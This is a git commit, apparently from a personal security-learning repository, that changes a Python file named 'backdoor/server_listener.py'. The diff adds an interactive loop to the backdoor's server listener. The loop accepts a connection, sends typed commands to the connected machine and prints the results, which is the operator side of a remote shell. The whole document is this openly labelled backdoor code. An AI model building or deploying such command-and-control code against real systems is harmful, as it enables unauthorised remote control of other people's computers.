edbd523cbbbfedd1058e1b16aec01276649ff290
V1ZEI-CN <vijaychowdary3699@gmail.com>
2021-12-16 17:58:29 +0530

    listener + client program in backdoor

--- backdoor/server_listener.py
+++ backdoor/server_listener.py
@@ -8,5 +8,11 @@ listener.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
 listener.bind(("<Local IP>", port_number))
 listener.listen(0)
 print("[+] Waiting for a connection")
-listener.accept()
+connection, address = listener.accept()
 print("[+] Got a connection")
+
+while True:
+  input_command = input(">>> ")
+  connection.send(input_command.encode('utf-8'))
+  result = connection.recv(1024).decode('utf-8')
+  print(result)
